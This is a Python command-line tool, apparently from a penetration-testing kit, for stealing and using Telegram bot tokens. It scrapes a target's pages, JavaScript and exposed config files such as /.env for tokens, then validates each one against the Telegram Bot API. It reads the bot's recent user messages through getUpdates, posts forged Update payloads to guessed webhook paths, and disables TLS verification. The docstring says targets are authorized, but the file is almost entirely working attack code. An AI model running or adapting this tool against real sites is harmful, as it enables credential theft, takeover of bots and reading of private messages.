#!/usr/bin/env python3
"""TG Bot Token 发现 + 验证 + 情报采集 + Webhook 伪造探测。

用法:
  # 从授权目标的 JS/页面中猎取 token
  python3 炼蛊房/tg_bot_token_probe.py hunt --target https://授权目标 --case <案卷>

  # 验证已知 token 并采集情报
  python3 炼蛊房/tg_bot_token_probe.py verify --token "1234567890:AAxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

  # 探测 webhook 端点是否接受伪造 Update
  python3 炼蛊房/tg_bot_token_probe.py webhook-probe --target https://授权目标

  # 从本地文件/目录中提取 token
  python3 炼蛊房/tg_bot_token_probe.py extract --path /path/to/files

不使用 setWebhook / sendMessage / deleteWebhook（先问）。
"""

from __future__ import annotations

import argparse
import json
import os
import re
import ssl
import sys
import urllib.request
import urllib.error
from datetime import datetime
from pathlib import Path

TOKEN_RE = re.compile(r'[0-9]{8,10}:[A-Za-z0-9_-]{35}')
BOT_API = "https://api.telegram.org/bot{token}/{method}"

WEBHOOK_PATHS = [
    "/webhook", "/bot", "/telegram/webhook", "/api/webhook",
    "/api/telegram", "/bot/webhook", "/.well-known/telegram",
    "/tg", "/hook", "/callback", "/telegram", "/tg/webhook",
]

ENGINE_ROOT = Path(__file__).resolve().parents[1]


def _ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _get(url: str, timeout: int = 10) -> dict | None:
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as resp:
            return json.loads(resp.read())
    except Exception:
        return None


def _post_json(url: str, data: dict, timeout: int = 10) -> tuple[int, str]:
    try:
        body = json.dumps(data).encode()
        req = urllib.request.Request(
            url, data=body, method="POST",
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        )
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return 0, str(e)


def _fetch_text(url: str, timeout: int = 15) -> str:
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as resp:
            return resp.read().decode(errors="replace")
    except Exception:
        return ""


# ── 子命令 ──────────────────────────────────────────────

def cmd_hunt(args) -> int:
    """从授权目标页面/JS 中猎取 Bot Token。"""
    target = args.target.rstrip("/")
    print(f"[*] 猎取 TG Bot Token: {target}")

    tokens_found: set[str] = set()

    # 1. 首页 HTML
    print("[*] 检查首页 HTML...")
    html = _fetch_text(target)
    tokens_found.update(TOKEN_RE.findall(html))

    # 2. 常见配置文件泄露
    config_paths = [
        "/.env", "/config.yml", "/config.yaml", "/config.json",
        "/docker-compose.yml", "/docker-compose.yaml",
        "/.env.local", "/.env.production", "/env.js", "/config.js",
    ]
    for path in config_paths:
        text = _fetch_text(f"{target}{path}")
        found = TOKEN_RE.findall(text)
        if found:
            print(f"  [!] {path} → {len(found)} token(s)")
            tokens_found.update(found)

    # 3. JS chunk 扫描（从 HTML 中提取 JS 链接）
    js_urls = re.findall(r'(?:src|href)=["\']([^"\']*\.js[^"\']*)["\']', html)
    print(f"[*] 扫描 {len(js_urls)} 个 JS 文件...")
    for js_url in js_urls[:50]:
        if js_url.startswith("//"):
            js_url = "https:" + js_url
        elif js_url.startswith("/"):
            js_url = target + js_url
        elif not js_url.startswith("http"):
            js_url = target + "/" + js_url
        text = _fetch_text(js_url)
        found = TOKEN_RE.findall(text)
        if found:
            print(f"  [!] {js_url.split('/')[-1]} → {len(found)} token(s)")
            tokens_found.update(found)

    if not tokens_found:
        print("[*] 未发现 token。建议：gitleaks/trufflehog 扫源码仓库、FOFA body 搜。")
        return 0

    print(f"\n[+] 发现 {len(tokens_found)} 个候选 token，开始验证...")
    valid = 0
    for token in sorted(tokens_found):
        result = _verify_token(token)
        if result:
            valid += 1
            _save_finding(args, token, result)

    print(f"\n[+] 有效 token: {valid}/{len(tokens_found)}")
    return 0


def cmd_verify(args) -> int:
    """验证已知 token 并采集情报。"""
    token = args.token.strip()
    if not TOKEN_RE.fullmatch(token):
        print(f"[!] 格式不符 token 正则: {token}")
        return 1

    result = _verify_token(token)
    if not result:
        print("[!] token 无效或已 revoke")
        return 1

    if hasattr(args, "case") and args.case:
        _save_finding(args, token, result)
    return 0


def cmd_webhook_probe(args) -> int:
    """探测 webhook 端点是否接受伪造 Update。"""
    target = args.target.rstrip("/")
    print(f"[*] 探测 webhook 端点: {target}")

    fake_update = {
        "update_id": 999999,
        "message": {
            "message_id": 1,
            "from": {"id": 12345, "is_bot": False, "first_name": "ProbeTest"},
            "chat": {"id": 12345, "type": "private"},
            "date": int(datetime.now().timestamp()),
            "text": "/ping",
        },
    }

    results = []
    for path in WEBHOOK_PATHS:
        url = f"{target}{path}"
        code, body = _post_json(url, fake_update)
        status = "可能可伪造" if code == 200 else f"HTTP {code}" if code else "超时/不可达"
        if code == 200:
            print(f"  [!] {path} → 200 OK（可能接受伪造 Update）")
            # 检查是否有 secret_token 校验
            code2, body2 = _post_json(url, fake_update)
            results.append({"path": path, "status": status, "response_preview": body[:200]})
        elif code in (401, 403):
            print(f"  [*] {path} → {code}（可能有 secret_token 校验）")
        elif code == 404:
            pass
        else:
            if code:
                print(f"  [-] {path} → {code}")

    if not results:
        print("[*] 未发现可伪造的 webhook 端点。")
    else:
        print(f"\n[+] {len(results)} 个端点可能接受伪造 Update！")
        for r in results:
            print(f"  {r['path']}: {r['response_preview'][:100]}")

    return 0


def cmd_extract(args) -> int:
    """从本地文件/目录中提取 token。"""
    path = Path(args.path)
    tokens_found: set[str] = set()

    if path.is_file():
        files = [path]
    elif path.is_dir():
        files = list(path.rglob("*"))
    else:
        print(f"[!] 路径不存在: {path}")
        return 1

    for f in files:
        if not f.is_file() or f.stat().st_size > 50 * 1024 * 1024:
            continue
        try:
            text = f.read_text(encoding="utf-8", errors="ignore")
            found = TOKEN_RE.findall(text)
            if found:
                print(f"  [!] {f.relative_to(path) if path.is_dir() else f.name} → {len(found)} token(s)")
                tokens_found.update(found)
        except Exception:
            continue

    if not tokens_found:
        print("[*] 未发现 token。")
        return 0

    print(f"\n[+] 发现 {len(tokens_found)} 个候选 token，开始验证...")
    valid = 0
    for token in sorted(tokens_found):
        result = _verify_token(token)
        if result:
            valid += 1

    print(f"\n[+] 有效 token: {valid}/{len(tokens_found)}")
    return 0


# ── 内部函数 ──────────────────────────────────────────────

def _verify_token(token: str) -> dict | None:
    """验证 token 并采集情报，返回情报 dict 或 None。"""
    print(f"\n  [*] 验证: {token[:15]}...{token[-5:]}")

    me = _get(BOT_API.format(token=token, method="getMe"))
    if not me or not me.get("ok"):
        print("    [-] 无效")
        return None

    bot_info = me["result"]
    print(f"    [+] 有效! @{bot_info.get('username', '?')} (id={bot_info.get('id')})")
    print(f"        first_name: {bot_info.get('first_name', '?')}")
    print(f"        can_join_groups: {bot_info.get('can_join_groups', '?')}")

    result = {"getMe": bot_info}

    # getMyDescription
    desc = _get(BOT_API.format(token=token, method="getMyDescription"))
    if desc and desc.get("ok"):
        result["description"] = desc["result"].get("description", "")
        if result["description"]:
            print(f"        description: {result['description'][:80]}")

    # getWebhookInfo（最关键：判断 bot 是否在跑）
    wh = _get(BOT_API.format(token=token, method="getWebhookInfo"))
    if wh and wh.get("ok"):
        wh_info = wh["result"]
        result["webhook"] = wh_info
        url = wh_info.get("url", "")
        has_secret = wh_info.get("has_custom_certificate", False)
        pending = wh_info.get("pending_update_count", 0)
        if url:
            print(f"    [!] Webhook 在跑: {url}")
            print(f"        pending_updates: {pending}")
            print(f"        has_custom_certificate: {has_secret}")
            print("        ⚠️ 动静大！不建议直接 getUpdates/setWebhook")
        else:
            print("    [*] 无 webhook（可安全 getUpdates）")

    # getUpdates（仅无 webhook 时尝试，只取最新 3 条评估）
    if not result.get("webhook", {}).get("url"):
        updates = _get(BOT_API.format(token=token, method="getUpdates") + "?limit=3&offset=-3")
        if updates and updates.get("ok"):
            msgs = updates["result"]
            result["recent_updates"] = len(msgs)
            print(f"    [*] 最近 update 数: {len(msgs)}")
            for u in msgs[:3]:
                msg = u.get("message", u.get("callback_query", {}).get("message", {}))
                text = msg.get("text", "")[:60] if msg else ""
                from_user = msg.get("from", {}).get("username", "?") if msg else "?"
                print(f"        @{from_user}: {text}")

    return result


def _save_finding(args, token: str, result: dict) -> None:
    """将发现写入案卷。"""
    case = getattr(args, "case", None)
    if not case:
        return

    out_dir = ENGINE_ROOT / "案卷" / case / "测绘" / "tg_bot_tokens"
    out_dir.mkdir(parents=True, exist_ok=True)

    bot_id = str(result.get("getMe", {}).get("id", "unknown"))
    out_file = out_dir / f"bot_{bot_id}.json"

    finding = {
        "token_prefix": token[:15] + "...",
        "timestamp": datetime.now().isoformat(),
        "target": getattr(args, "target", "manual"),
        **result,
    }

    out_file.write_text(json.dumps(finding, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"    [+] 证据已落: {out_file.relative_to(ENGINE_ROOT)}")


def main():
    ap = argparse.ArgumentParser(description="TG Bot Token 猎取/验证/情报采集")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_hunt = sub.add_parser("hunt", help="从授权目标页面/JS 猎取 token")
    p_hunt.add_argument("--target", required=True, help="目标 URL")
    p_hunt.add_argument("--case", default="", help="案卷名")

    p_verify = sub.add_parser("verify", help="验证已知 token")
    p_verify.add_argument("--token", required=True, help="Bot token")
    p_verify.add_argument("--case", default="", help="案卷名")

    p_webhook = sub.add_parser("webhook-probe", help="探测 webhook 伪造")
    p_webhook.add_argument("--target", required=True, help="目标 URL")

    p_extract = sub.add_parser("extract", help="从本地文件提取 token")
    p_extract.add_argument("--path", required=True, help="文件/目录路径")

    args = ap.parse_args()

    if args.cmd == "hunt":
        return cmd_hunt(args)
    if args.cmd == "verify":
        return cmd_verify(args)
    if args.cmd == "webhook-probe":
        return cmd_webhook_probe(args)
    if args.cmd == "extract":
        return cmd_extract(args)
    return 0


if __name__ == "__main__":
    sys.exit(main())
